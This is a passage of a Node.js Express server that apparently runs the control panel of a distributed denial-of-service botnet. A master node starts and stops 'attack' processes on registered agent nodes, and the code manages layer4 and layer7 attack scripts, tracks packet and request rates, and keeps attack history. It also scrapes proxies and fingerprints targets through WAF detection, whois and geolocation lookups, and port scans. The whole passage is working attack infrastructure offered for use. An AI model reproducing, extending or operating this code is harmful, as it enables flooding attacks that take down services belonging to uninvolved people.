      if (!proc) {
        return res.status(404).json({ error: 'Process ID tidak ditemukan di agent ini' });
      }

      if (proc.ls) {
        proc.ls.kill('SIGINT');
      }

      clearInterval(stats[processId]?._interval);
      delete stats[processId];
      delete activeProcesses[processId];

      logActivity("STOP_PROCESS_AGENT", { processId, agent: true });

      return res.json({ message: `Proses ${processId} dihentikan di agent` });
    }

    // === Jika NODE_TYPE master ===
    const proc = activeProcesses[processId];

    if (proc?.ls) {
      proc.ls.kill('SIGINT');
      clearInterval(stats[processId]?._interval);
      delete stats[processId];
      delete activeProcesses[processId];

      logActivity("STOP_PROCESS_MASTER", { processId });
      broadcastWS({ type: "attack_stopped", processId, exitCode: 'stopped_by_user' });
      updateAttackHistory(processId, {
        endTime: new Date().toISOString(),
        status: 'stopped',
        exitCode: 'stopped_by_user'
      });
    }

    const agentInfo = proc?.isAgent ? proc : agentProcessMap[processId];
    if (!agentInfo || !agentInfo.agentUrl) {
      return res.status(404).json({ error: 'Tidak ada info agen untuk processId ini' });
    }

    try {
      const stopRes = await axios.post(`${agentInfo.agentUrl}/api/attack/stop-by-id`, {
        key: AGENT_KEY,
        processId
      });

      logActivity("MASTER_STOP_BY_ID_AGENT", { processId, agent: agentInfo.agentName });

      return res.json({
        message: `Proses ${processId} dihentikan di agent`,
        agent: agentInfo.agentName,
        result: stopRes.data
      });
    } catch (err) {
      return res.status(500).json({ error: `Gagal menghentikan proses di agent: ${err.message}` });
    }
  } catch (err) {
    logActivity("ERROR_STOP_BY_ID", { processId, error: err.message });
    res.status(500).json({ error: 'Kesalahan internal saat menghentikan proses' });
  }
});

app.get('/api/attack/stats', validateApiKey, async (req, res) => {
  const { key } = req.query;
  
  const processStats = {};
  const pidMap = {};

  for (const pid in activeProcesses) {
    const proc = activeProcesses[pid];
    processStats[pid] = {
      status: proc.status,
      lastResponse: proc.lastResponse,
      restartCount: proc.restartCount || 0,
      pid: proc.ls?.pid,
      script: proc.scriptName,
      args: proc.args,
      rps: stats[pid]?.rps || 0,
      pps: stats[pid]?.pps || 0,
      bps: stats[pid] ? Number((stats[pid].bps / 1_000_000).toFixed(2)) : 0,
      cpuPercent: null,
      memoryMB: null
    };
    if (proc.ls?.pid) pidMap[pid] = proc.ls.pid;
  }
  try {
  if (Object.values(pidMap).length > 0) {
    const pidList = Object.values(pidMap);
    const BATCH_SIZE = 10;

    for (let i = 0; i < pidList.length; i += BATCH_SIZE) {
      const batch = pidList.slice(i, i + BATCH_SIZE);
      try {
        const usageResult = await pidusage(batch);
        for (const [processId, pid] of Object.entries(pidMap)) {
          if (!batch.includes(pid)) continue;
          const usage = usageResult[pid];
          if (usage && processStats[processId]) {
            processStats[processId].cpuPercent = Number(usage.cpu.toFixed(2));
            processStats[processId].memoryMB = Math.round(usage.memory / 1024 / 1024);
          }
        }
      } catch (err) {
        logActivity("PIDUSAGE_BATCH_ERROR", { error: err.message, batch });
      }
    }
  }
} catch (outerErr) {
  logActivity("PIDUSAGE_OUTER_FAIL", { error: outerErr.message });
}

  const cpus = os.cpus();
  let totalIdle = 0, totalTick = 0;
  cpus.forEach(cpu => {
    for (let type in cpu.times) totalTick += cpu.times[type];
    totalIdle += cpu.times.idle;
  });
  const idle = totalIdle / cpus.length;
  const total = totalTick / cpus.length;
  const cpuUsage = 100 - ~~(100 * idle / total);
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemMB = Math.round((totalMem - freeMem) / 1024 / 1024);
  const totalMemMB = Math.round(totalMem / 1024 / 1024);

  if (NODE_TYPE === 'master') {
    loadAgents();
    const agentResults = await Promise.all(AGENT_LIST.map(async (agent) => {
      const start = Date.now();
      try {
        const r = await axios.get(`${agent.url}/api/attack/stats`, {
          params: { key: AGENT_KEY },
          timeout: 30000
        });
        const ping = Date.now() - start;
        return { agent, status: 'success', data: { ...r.data, ping } };
      } catch (err) {
        return { agent, status: 'failed', error: err.message };
      }
    }));
    const filteredProcessStats = {};
const includeMaster = MASTER_ATTACK_SELF;
for (const [pid, stat] of Object.entries(processStats)) {
  const isMaster = !stat.node || stat.node === 'MASTER';
  if (isMaster && includeMaster) {
    filteredProcessStats[pid] = stat;
  } else if (!isMaster) {
    filteredProcessStats[pid] = stat;
  }
}

return res.json({
  master: {
    processStats: filteredProcessStats,
    serverResource: {
      cpuUsagePercent: cpuUsage,
      usedMemoryMB: usedMemMB,
      totalMemoryMB: totalMemMB,
      memoryUsagePercent: Math.round(100 * usedMemMB / totalMemMB),
      uptimeSeconds: Math.floor(process.uptime())
    }
  },
  agentStats: agentResults
});
  }
  res.json({
    processStats,
    serverResource: {
      cpuUsagePercent: cpuUsage,
      usedMemoryMB: usedMemMB,
      totalMemoryMB: totalMemMB,
      memoryUsagePercent: Math.round(100 * usedMemMB / totalMemMB),
      uptimeSeconds: Math.floor(process.uptime())
    }
  });
});

app.get('/api/attack/history', disableIfAgent(), validateApiKey, (req, res) => {
  res.json(readHistory());
});

app.delete('/api/attack-history', disableIfAgent(), validateApiKey, (req, res) => {
  try {
    fs.writeFileSync(historyPath, '[]', 'utf8');
    res.send('Attack history cleared.');
  } catch(e) {
    res.status(500).send('Gagal menghapus riwayat.');
  }
});

app.get('/api/attack/stats/daily', disableIfAgent(), validateApiKey, (req, res) => {
  const history = readHistory();
  const dailyStats = {};

  for (const entry of history) {
    if (!entry.startTime) continue;

    const date = new Date(entry.startTime).toISOString().split('T')[0];
    if (!dailyStats[date]) {
      dailyStats[date] = {
        total: 0,
        methods: {},
        agents: {},
      };
    }
    dailyStats[date].total += 1;

    const method = entry.method || 'unknown';
    const who = entry.who || 'unknown';

    dailyStats[date].methods[method] = (dailyStats[date].methods[method] || 0) + 1;
    dailyStats[date].agents[who] = (dailyStats[date].agents[who] || 0) + 1;
  }
  res.json(dailyStats);
});
// ========================= ENDPOINT: PLUGIN MANAGEMENT =========================
app.get('/api/plugins/list', requireLogin, requireAdmin, (req, res) => {
loadPlugins();
  const plugins = fs.readdirSync(path.join(__dirname, 'plugins'))
    .filter(f => f.endsWith('.js') && !f.startsWith('_'))
    .map(file => {
      const name = file.replace(/\.js$/, '');
      const disabled = readConfig()?.disabledPlugins || [];
      return {
        name,
        enabled: !disabled.includes(name)
      };
    });
  res.json({ plugins });
});

app.post('/api/plugins/:name/toggle', requireLogin, requireAdmin, (req, res) => {
  const name = req.params.name;
  const config = readConfig();
  config.disabledPlugins = config.disabledPlugins || [];

  const index = config.disabledPlugins.indexOf(name);
  let enabled;

  if (index === -1) {
    // Disable
    config.disabledPlugins.push(name);
    enabled = false;

    // cleanup & remove
    if (loadedPlugins[name] && typeof loadedPlugins[name].cleanup === "function") {
      try {
        loadedPlugins[name].cleanup();
      } catch (e) {
        logActivity("PLUGIN_DISABLE_CLEANUP_ERROR", { plugin: name, error: e.message });
      }
    }
    delete loadedPlugins[name];
  } else {
    // Enable
    config.disabledPlugins.splice(index, 1);
    enabled = true;

    // ✅ Panggil reload biar langsung aktif
    reloadPlugin(name);
  }

  writeConfig(config);
  res.json({ success: true, enabled });
});

app.post('/api/plugins/:name/reload', requireLogin, requireAdmin, (req, res) => {
  const name = req.params.name;
  const success = reloadPlugin(name);
  res.json({ success });
});

app.post('/api/plugins/upload', disableIfAgent(), validateKeyAndLogin, upload.single('plugin'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Tidak ada file plugin yang diupload' });

  const tempPath = req.file.path;
  const finalPath = path.join(PLUGINS_DIR, req.file.originalname);

  if (!isValidFileName(req.file.originalname)) {
    cleanupTempFile(tempPath);
    return res.status(400).json({ error: 'Nama file plugin tidak valid' });
  }

  try {
    const content = fs.readFileSync(tempPath, 'utf8');
    
    if (!content.includes('exports.init =') && !content.includes('module.exports =')) {
      cleanupTempFile(tempPath);
      return res.status(400).json({ error: 'Plugin harus mengekspor fungsi init()' });
    }

    fs.renameSync(tempPath, finalPath);
    
    try {
      delete require.cache[require.resolve(finalPath)];
      const plugin = require(finalPath);
      
      if (typeof plugin.init !== 'function') {
        fs.unlinkSync(finalPath);
        return res.status(400).json({ error: 'Plugin harus memiliki fungsi init()' });
      }
    } catch (loadErr) {
      fs.unlinkSync(finalPath);
      return res.status(400).json({ 
        error: `Validasi plugin gagal: ${loadErr.message}`,
        detail: process.env.NODE_ENV === 'development' ? loadErr.stack : undefined
      });
    }
    
    logActivity("PLUGIN_UPLOAD_SUCCESS", { plugin: req.file.originalname });
    res.json({ 
      message: 'Plugin berhasil diupload dan divalidasi',
      plugin: req.file.originalname 
    });
  } catch (e) {
    cleanupTempFile(tempPath);
    if (fs.existsSync(finalPath)) fs.unlinkSync(finalPath);
    logActivity("PLUGIN_UPLOAD_ERROR", { error: e.message });
    res.status(500).json({ 
      error: 'Gagal mengupload plugin',
      detail: process.env.NODE_ENV === 'development' ? e.stack : undefined
    });
  }
});
// ========================= ENDPOINT: METHOD MANAGEMENT =========================
app.get('/api/methods', disableIfAgent(), validateApiKey, (req, res) => {
  res.json(readMethods());
});

app.post('/api/methods', validateApiKey, (req, res) => {
  const { name, script, args, layer } = req.body;

  if (!name || !script || !Array.isArray(args) || !['layer4', 'layer7'].includes(layer)) {
    return res.status(400).json({ error: 'Input tidak valid' });
  }

  const methods = readMethods();
  if (methods[name]) return res.status(409).json({ error: 'Method sudah ada' });

  methods[name] = { script, args, layer };
  writeMethods(methods);

  res.json({ success: true });
});

app.put('/api/methods/:name', disableIfAgent(), validateApiKey, (req, res) => {
  const { name, script, args, layer } = req.body;
  const oldName = req.params.name;

  if (!name || !script || !Array.isArray(args) || !['layer4', 'layer7'].includes(layer)) {
    return res.status(400).json({ error: 'Input tidak valid' });
  }

  const methods = readMethods();
  if (oldName !== name) delete methods[oldName];

  methods[name] = { script, args, layer };
  writeMethods(methods);

  res.json({ success: true });
});

app.delete('/api/methods/:name', disableIfAgent(), validateApiKey, async (req, res) => {
  loadAgents();
  const methods = readMethods();
  const name = req.params.name;
  if (!methods[name]) return res.status(404).send('Method tidak ditemukan');
  const scriptFile = methods[name].script;
  delete methods[name];
  writeMethods(methods);
  logActivity("DELETE_METHOD", { name, scriptFile });

  let fileDeleted = false;
  if (scriptFile) {
    const filePath = path.join(uploadDir, scriptFile);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      fileDeleted = true;
      logActivity("DELETE_METHOD_FILE_AUTO", { scriptFile });
    }
  }

  let results = [];
  if (NODE_TYPE === "master" && AGENT_LIST && AGENT_LIST.length && scriptFile) {
    results = await Promise.all(AGENT_LIST.map(agent =>
      axios.post(`${agent.url}/api/methods/delete-file`, { 
        key: AGENT_KEY, 
        filename: scriptFile 
      }).then(()=>({agent,status:'success'})).catch(e=>({agent,status:'failed',error:e.message}))
    ));
    logActivity("SYNC_DELETE_METHOD_FILE", { scriptFile, results });
  }
  res.json({ message: 'Method dihapus', name, fileDeleted, sync: results });
});
// ========================= ENDPOINT: FILE METHOD MANAGEMENT =========================
app.post('/api/uploadmeth', disableIfAgent(), requireLogin, requireAdmin, upload.single('file'), validateApiKey, async (req, res) => {
  const key = req.query.key || req.body.key;
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');
  const forbiddenNames = ['api.js', 'index.js', 'server.js'];
  const uploadedName = req.file.originalname.toLowerCase();
  const tempPath = req.file.path;
  if (
    forbiddenNames.includes(uploadedName) ||
    uploadedName.includes('..') ||
    !isValidFileName(uploadedName) ||
    uploadedName.startsWith('.')
  ) {
    cleanupTempFile(tempPath);
    logActivity("BLOCK_UPLOAD_FILENAME", { file: uploadedName });
    return res.status(400).send('Nama file tidak diizinkan.');
  }
  let fileContent = '';
  try { fileContent = fs.readFileSync(tempPath, 'utf8'); }
  catch (e) {
    cleanupTempFile(tempPath);
    return res.status(400).send('Gagal membaca isi file');
  }
  for (const keyword of DANGEROUS_KEYWORDS) {
    if (fileContent.includes(keyword)) {
      cleanupTempFile(tempPath);
      logActivity("BLOCK_UPLOAD", { file: req.file.filename, keyword });
      await sendTelegramPhoto(
        `🚫 *Upload file diblokir*\n` +
        `*Keyword berbahaya terdeteksi:* \`${escapeTelegram(keyword)}\`\n` +
        `*File:* \`${escapeTelegram(req.file.filename)}\``
      );
      return res.status(400).send(`Upload diblokir: terdeteksi keyword berbahaya ("${keyword}")`);
    }
  }
  const ext = path.extname(req.file.originalname);
  const base = path.basename(req.file.originalname, ext);
  const uniqueSuffix = `${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  const finalName = `${base}_${uniqueSuffix}${ext}`;

  let destPath;
  try {
    destPath = getSafeFilePath(uploadDir, finalName);
  } catch (e) {
    cleanupTempFile(tempPath);
    return res.status(400).send(e.message);
  }
  try {
    fs.renameSync(tempPath, destPath);
    const stats = fs.statSync(destPath);
    if (stats.size > MAX_FILE_SIZE) {
      fs.unlinkSync(destPath);
      return res.status(400).send('File terlalu besar setelah proses upload');
    }
  } catch (e) {
    cleanupTempFile(tempPath);
    return res.status(500).send('Gagal menyimpan file');
  }
  logActivity("UPLOAD_METHOD_FILE", { file: finalName, size: req.file.size });
  await sendTelegramPhoto(
    `📁 *File method baru di-upload*\n` +
    `*Nama:* \`${escapeTelegram(finalName)}\`\n` +
    `*Ukuran:* \`${req.file.size} bytes\``
  );
  res.json({
    message: 'File berhasil di-upload',
    fileName: finalName,
    path: `lib/method/${finalName}`
  });
});

app.get('/api/method-files', disableIfAgent(), validateApiKey, async (req, res) => {
  fs.readdir(uploadDir, async (err, files) => {
    if (err) return res.status(500).send('Gagal membaca direktori');
    try {
      const fileList = await Promise.all(
        files.filter(f=>!f.startsWith('.')).map(async f => {
          const stat = await fs.promises.stat(path.join(uploadDir, f));
          return {
            name: f,
            size: stat.size,
            mtime: stat.mtime
          }
        })
      );
      res.json(fileList);
    } catch(e) {
      res.status(500).send('Gagal membaca file');
    }
  });
});

app.delete('/api/method-files/:filename', disableIfAgent(), validateApiKey, validateFileName, async (req, res) => {
  const filename = req.params.filename;
  let filePath;
  try { filePath = getSafeFilePath(uploadDir, filename); }
  catch(e) { return res.status(400).send(e.message); }
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  try {
    fs.unlinkSync(filePath);
    logActivity("DELETE_METHOD_FILE", { file: filename });
    res.json({ message: 'File dihapus', file: filename });
  } catch (e) {
    logActivity("DELETE_FILE_FAIL", { file: filename, error: e.message });
    return res.status(500).json({ error: 'Gagal menghapus file', detail: e.message });
  }
});

app.get('/api/method-files/download/:filename', disableIfAgent(), validateApiKey, validateFileName, (req, res) => {
  let filePath;
  try { filePath = getSafeFilePath(uploadDir, req.params.filename); }
  catch(e) { return res.status(400).send(e.message); }
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  res.download(filePath, err => {
    if (err) {
      logActivity("DOWNLOAD_METHOD_FILE_ERROR", { filename: req.params.filename, error: err.message });
      if (!res.headersSent) res.status(500).send('Gagal download file');
    }
  });
});

app.post('/api/method-files/rename', disableIfAgent(), validateApiKey, validateFileName, express.json(), (req, res) => {
  const { oldName, newName, key } = req.body;
  if (!oldName || !newName) return res.status(400).send('Parameter oldName dan newName diperlukan');
  if (!isValidFileName(newName)) return res.status(400).send('Nama file baru tidak valid');
  let oldPath, newPath;
  try {
    oldPath = getSafeFilePath(uploadDir, oldName);
    newPath = getSafeFilePath(uploadDir, newName);
  } catch(e) { return res.status(400).send(e.message); }
  if (!fs.existsSync(oldPath)) return res.status(404).send('File lama tidak ditemukan');
  if (fs.existsSync(newPath)) return res.status(409).send('File dengan nama baru sudah ada');
  try {
    fs.renameSync(oldPath, newPath);
    logActivity("RENAME_METHOD_FILE", { from: oldName, to: newName });
    res.json({ message: 'Nama file berhasil diubah', from: oldName, to: newName });
  } catch(e) {
    logActivity("RENAME_FILE_FAIL", { from: oldName, to: newName, error: e.message });
    res.status(500).send('Gagal rename file');
  }
});

app.get('/api/method-files/view/:filename', disableIfAgent(), validateApiKey, validateFileName, (req, res) => {
  let filePath;
  try {
    filePath = getSafeFilePath(uploadDir, req.params.filename);
  } catch (e) {
    return res.status(400).send(e.message);
  }

  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');

  try {
    const content = fs.readFileSync(filePath, 'utf8');
    res.type('text/plain').send(content);
  } catch (e) {
    res.status(500).send('Gagal membaca file');
  }
});

app.post('/api/method-files/save/:filename', disableIfAgent(), validateApiKey, validateFileName, express.text({ type: '*/*', limit: '5mb' }), async (req, res) => {
  const filename = req.params.filename;
  let filePath;
  try { filePath = getSafeFilePath(uploadDir, filename); }
  catch(e) { return res.status(400).send(e.message); }
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  try {
    if (Buffer.byteLength(req.body, 'utf8') > MAX_FILE_SIZE)
      return res.status(400).send('File terlalu besar');
    fs.writeFileSync(filePath, req.body, 'utf8');
    logActivity("EDIT_METHOD_FILE", { file: filename });
    res.json({ message: 'File berhasil disimpan', file: filename });
  } catch(e) {
    logActivity("EDIT_FILE_FAIL", { file: filename, error: e.message });
    res.status(500).send('Gagal menyimpan file');
  }
});
// ========================= ENDPOINT: AGENT MANAGEMENT =========================
app.get('/api/agents', disableIfAgent(), validateApiKey, async (req, res) => {
    loadAgents();
    res.json(AGENT_LIST);
});

app.get('/api/agents/summary', disableIfAgent(), validateApiKey, async (req, res) => {
    loadAgents();
    const totalAgents = AGENT_LIST.length;
    const activeAgents = AGENT_LIST.filter(a => a.enabled !== false).length;

    res.json({
      total: totalAgents,
      active: activeAgents
    });
});

app.post('/api/agents', disableIfAgent(), express.json(), validateApiKey, async (req, res) => {
  const { name, url, tags = [] } = req.body;
  if (!name || !url) return res.status(400).send('Nama dan URL wajib diisi');
    loadAgents();
    if (AGENT_LIST.some(a => a.name === name)) return res.status(400).send('Agent dengan nama ini sudah ada');
    const newAgent = { name, url, enabled: true, tags };
    AGENT_LIST.push(newAgent);
    saveAgentsAndFlush();
    logActivity("AGENT_ADDED", newAgent);
    res.json({ message: 'Agent ditambahkan', agent: newAgent });
});

app.put('/api/agents/:name', disableIfAgent(), express.json(), validateApiKey, async (req, res) => {
  const name = req.params.name;
  const { url, enabled, tags } = req.body;
    loadAgents();
    const idx = AGENT_LIST.findIndex(a => a.name === name);
    if (idx === -1) return res.status(404).json({ error: "Agent tidak ditemukan" });

    if (url) AGENT_LIST[idx].url = url;
    if (typeof enabled === 'boolean') AGENT_LIST[idx].enabled = enabled;
    if (Array.isArray(tags)) AGENT_LIST[idx].tags = tags;

    saveAgentsAndFlush();
    res.json({ message: "Agent berhasil diperbarui" });
});

app.delete('/api/agents/:name', disableIfAgent(), validateApiKey, (req, res) => {
  const name = req.params.name;
  loadAgents();
  const idx = AGENT_LIST.findIndex(a => a.name === name);
  if (idx === -1) return res.status(404).send('Agent tidak ditemukan');
  const removed = AGENT_LIST.splice(idx, 1)[0];
  saveAgentsAndFlush();
  logActivity("AGENT_DELETED", removed);
  res.json({ message: 'Agent dihapus', agent: removed });
});

app.post('/api/agents/register', express.json(), (req, res) => {
  if (NODE_TYPE !== 'master') return res.status(403).send('Hanya master!');

  const { name, url, agentKey, fingerprint } = req.body;

  if (!name || !url || !fingerprint || agentKey !== AGENT_KEY)
    return res.status(400).send('Parameter salah atau API key tidak valid');

  if (!/^[a-f0-9]{64}$/i.test(fingerprint)) {
    return res.status(400).send('Fingerprint tidak valid (harus 64 karakter hex)');
  }

  const now = Date.now();
  if (!global.LAST_REGISTER_TIME) global.LAST_REGISTER_TIME = 0;
  if (now - global.LAST_REGISTER_TIME < 1000) {
    return res.status(429).json({ error: 'Terlalu sering register. Coba lagi nanti.' });
  }
  global.LAST_REGISTER_TIME = now;

  loadAgents();

  const existing = AGENT_LIST.find(a => a.fingerprint === fingerprint);

  if (existing) {
    if (existing.url !== url) {
      existing.url = url;
      logActivity("AGENT_URL_UPDATED", { name: existing.name, newUrl: url });
    saveAgentsAndFlush();
    }
    return res.json({ message: 'Sudah terdaftar', agent: existing });
  }

  const nameConflict = AGENT_LIST.find(a => a.name === name);
  if (nameConflict) {
    return res.status(400).json({ error: `Nama agent "${name}" sudah dipakai oleh agent lain.` });
  }

  const newAgent = {
    name,
    url,
    fingerprint,
    enabled: true,
    auto: true,
    registeredAt: new Date().toISOString()
  };
  AGENT_LIST.push(newAgent);
  saveAgentsAndFlush();
  logActivity("AGENT_REGISTER_AUTO", newAgent);
  res.json({ message: 'Agent terdaftar', agent: newAgent });
});
// ========================= ENDPOINT: PROXY SCRAPE & SYNC =========================
app.get('/api/scrape-proxies', disableIfAgent(), requireLogin, requireAdmin, validateApiKey, async (req, res) => {
  const key = req.query.key;
  const protocols = (req.query.protocols || 'http,https,socks4,socks5')
    .split(',')
    .map(e => e.trim().toLowerCase())
    .filter(Boolean);
  const country = req.query.country || 'ALL';

  try {
    const { proxies, stats } = await scrapeProxy({ protocols, country });

    const proxyFilePath = path.join(__dirname, 'proxy.txt');
    fs.writeFileSync(proxyFilePath, proxies.join('\n'), 'utf8');

    logActivity("PROXY_SCRAPE_SAVED", {
      total: proxies.length,
      protocols,
      savedTo: 'proxy.txt'
    });

    res.json({
      message: 'Scrape proxy selesai',
      total: stats.total,
      byProto: stats.byProto,
      example: proxies.slice(0, 5)
    });
  } catch (e) {
    logActivity("SCRAPE_PROXY_ERROR", { error: e.message });
    res.status(500).json({ error: e.message || e.toString() });
  }
});
// ========================= ENDPOINT: TOOLS (HEALTH, HOSTCHECK, FINGERPRINT) =========================
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    cpu: os.loadavg()[0],
    memory: Math.round(process.memoryUsage().rss / 1024 / 1024),
    totalMemory: Math.round(os.totalmem() / 1024 / 1024),
    hostname: os.hostname()
  });
});

app.get('/api/agents/health', disableIfAgent(), validateApiKey, async (req, res) => {
  const key = req.query.key;

  loadAgents();
  const results = [];

  for (const agent of AGENT_LIST) {
    if (!agent.enabled) continue;

    try {
      const start = Date.now();
      const response = await axios.get(`${agent.url}/api/health`, { timeout: 30000 });
      const ping = Date.now() - start;

      results.push({
        agent,
        status: 'success',
        data: {
          ...response.data,
          ping
        }
      });
    } catch (err) {
      results.push({
        agent,
        status: 'error',
        error: err.message,
      });
      if (agent.enabled === false && agent.failCount >= 3) {
  agent.failCount = 0;
  agent.enabled = true;
  logActivity("AGENT_RE_ENABLED", { agent });
  saveAgentsAndFlush();
  }
    }
  }
  res.json(results);
  broadcastWS({ type: "agent_health", agents: results });
});
setInterval(async () => {
  try {
    loadAgents();
    const now = Date.now();
    let changed = false;
    const toDelete = [];

    for (let i = 0; i < AGENT_LIST.length; i++) {
      const agent = AGENT_LIST[i];
      if (!agent) continue;

      let isHealthy = false;

      for (let retry = 0; retry < 3; retry++) {
        try {
          await axios.get(`${agent.url}/api/health`, { timeout: 30000 });
          isHealthy = true;
          break;
        } catch (err) {
          if (retry < 2) await new Promise(r => setTimeout(r, 1000));
        }
      }

      if (isHealthy) {
        if (!agent.enabled) {
          agent.enabled = true;
          logActivity("AGENT_RE_ENABLED", { agent });
          broadcastWS({ type: "agent_status_update", agent });
          try {
            saveAgentsAndFlush();
          } catch (e) {
            logActivity("SAVE_AGENTS_ERROR", { error: e.message });
          }
        }
        agent.lastOnline = now;
      } else {
        const registeredAtTime = agent.registeredAt ? new Date(agent.registeredAt).getTime() : now;
        const lastOnlineTime = agent.lastOnline || registeredAtTime;
        const offlineDuration = now - lastOnlineTime;

        if (offlineDuration > 3 * 60 * 1000) {
          if (AUTO_DELETE_AGENT) {
            logActivity("AGENT_DELETED_OFFLINE", { agent, reason: "Offline > 3 menit" });
            broadcastWS({ type: "agent_deleted", agent });
            toDelete.push(i);
            changed = true;
          } else {
            if (agent.enabled !== false) {
              agent.enabled = false;
              logActivity("AGENT_MARKED_OFFLINE", { agent, reason: "Offline > 3 menit" });
              broadcastWS({ type: "agent_status_update", agent });
              changed = true;
            }
          }
        }
      }
    }

    for (let i = toDelete.length - 1; i >= 0; i--) {
      AGENT_LIST.splice(toDelete[i], 1);
    }
    if (changed) {
      try {
        saveAgentsAndFlush();
      } catch (e) {
        logActivity("SAVE_AGENTS_ERROR", { error: e.message });
      }
    }
  } catch (e) {
    logActivity("AGENT_HEALTH_LOOP_ERROR", { error: e?.message || String(e) });
    console.error("AGENT_HEALTH_LOOP_ERROR:", e?.message || e);
  }
}, 5_000);

app.get('/api/hostcheck', disableIfAgent(), validateApiKey, async (req, res) => {
  const key = req.query.key;
  const host = req.query.host;

  if (!host) return res.status(400).send("Host tidak diberikan");

  try {
    let urlToTest = host;
    if (!/^https?:\/\//i.test(host)) urlToTest = `http://${host}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;

    let resolvedIp = '';
    try {
      const dnsRes = await dns.lookup(hostname);
      resolvedIp = dnsRes.address;
    } catch (e) {
      resolvedIp = hostname;
    }

    let online = false, latency = null, errorCode = null;
try {
  const start = Date.now();
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);

  const resp = await fetch(urlToTest, { signal: controller.signal });

  clearTimeout(timeout);
  latency = Date.now() - start;
  if (resp.ok || (resp.status >= 200 && resp.status < 500)) {
    online = true;
  } else {
    errorCode = resp.status;
  }
} catch (e) {
  latency = null;
  errorCode = e.name === 'AbortError' ? 'TIMEOUT' : e.code || e.message || 'FETCH_ERROR';
}
    const ipInfoRes = await fetch(`https://ipwho.is/${resolvedIp}`);
    const ipInfo = await ipInfoRes.json();

    return res.json({
      status: online ? 'online' : 'offline',
      latency,
      errorCode: online ? null : errorCode,
      ip: ipInfo.ip || resolvedIp,
      asn: ipInfo.connection?.asn || null,
      org: ipInfo.connection?.org || null,
      isp: ipInfo.connection?.isp || null,
      country: ipInfo.country || null,
      region: ipInfo.region || null,
      city: ipInfo.city || null,
      latitude: ipInfo.latitude || null,
      longitude: ipInfo.longitude || null
    });
  } catch (e) {
    return res.status(500).json({ error: 'Gagal memeriksa host', detail: e.message });
  }
});

app.get('/api/fingerprint-full', disableIfAgent(), validateApiKey, async (req, res) => {
  const key = req.query.key;
  const target = req.query.target;
  if (!target) return res.status(400).send("Parameter 'target' diperlukan");
  try {
    const result = {
      target,
      urlInfo: {},
      dnsInfo: {},
      wafDetection: null,
      whois: {},
      geo: {},
      openPorts: [],
      error: null
    };
    const urlToTest = /^https?:\/\//.test(target) ? target : `http://${target}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;
    try {
      const dnsRes = await dns.lookup(hostname);
      result.dnsInfo.ip = dnsRes.address;
    } catch (e) {
      result.dnsInfo.ip = null;
    }
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const head = await fetch(urlToTest, { method: 'HEAD', signal: controller.signal });
      clearTimeout(timeout);
      const headers = {};
      head.headers.forEach((v, k) => headers[k.toLowerCase()] = v);
      result.urlInfo.headers = headers;
      result.urlInfo.status = head.status;
      result.urlInfo.server = headers['server'] || null;
      result.urlInfo.poweredBy = headers['x-powered-by'] || null;
      if (headers['server']?.toLowerCase().includes('cloudflare') || headers['cf-ray']) {
        result.wafDetection = 'Cloudflare';
      } else if (headers['x-sucuri-id']) {
        result.wafDetection = 'Sucuri';
      } else if (headers['x-akamai-transformed']) {
        result.wafDetection = 'Akamai';
      } else if (headers['x-cdn']) {
        result.wafDetection = `CDN - ${headers['x-cdn']}`;
      }
    } catch (e) {
      result.urlInfo.error = 'Gagal ambil header: ' + e.message;
    }
    try {
      const whoisData = await whois(hostname);
      result.whois = {
        asn: whoisData.asn || whoisData['origin'] || null,
        org: whoisData.org || whoisData['OrgName'] || null,
        country: whoisData.country || whoisData['Country'] || null
      };
    } catch (e) {
      result.whois = { error: e.message };
    }
    try {
      if (result.dnsInfo.ip) {
        const ipInfoRes = await fetch(`https://ipwho.is/${result.dnsInfo.ip}`);
        const ipInfo = await ipInfoRes.json();
        result.geo = {
          asn: ipInfo.connection?.asn,
          org: ipInfo.connection?.org,
          isp: ipInfo.connection?.isp,
          country: ipInfo.country,
          city: ipInfo.city,
          region: ipInfo.region
        };
      }
    } catch (e) {
      result.geo = { error: e.message };
    }
    if (result.dnsInfo.ip) {
      try {
        result.openPorts = await scanCommonPorts(result.dnsInfo.ip);
      } catch (e) {
        result.openPortsError = e.message;
      }
    }
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: 'Gagal fingerprint', detail: e.message });
  }
});
// ========================= ENDPOINT: LOG =========================
app.get('/api/activity-log', disableIfAgent(), validateApiKey, (req,res)=>{
  const logPath = path.join(dataDir, 'activity.log');
  if(!fs.existsSync(logPath)) return res.send('');
  res.set('Content-Type','text/plain').send(fs.readFileSync(logPath,'utf8'));
});
app.delete('/api/activity-log', disableIfAgent(), validateApiKey, (req,res)=>{
  const logPath = path.join(dataDir, 'activity.log');
  fs.writeFileSync(logPath, '');
  res.send('Log cleared');
});
// ========================= ENDPOINT: AGENT FILE SYNC =========================
app.post('/api/methods/delete-file', express.json(), validateApiKey, (req, res) => {
  loadAgents();
  const body = req.body;
  const { filename } = body;
  if (!filename) return res.status(400).send('Parameter filename diperlukan');
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.json({ message: 'File sudah tidak ada' });
  try {
    fs.unlinkSync(filePath);
    logActivity("AGENT_DELETE_METHOD_FILE", { file: filename });
    res.json({ message: 'File dihapus di agent', file: filename });
  } catch(e) {
    logActivity("AGENT_DELETE_METHOD_FILE_FAIL", { file: filename, error: e.message });
    res.status(500).json({ error: 'Gagal menghapus file', detail: e.message });
  }
});

app.post('/api/update', validateApiKey, upload.single('file'), async (req, res) => {
  const key = req.query.key || req.body.key;
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');

  const allowedExt = ['.js', '.sh'];
  const ext = path.extname(req.file.originalname).toLowerCase();
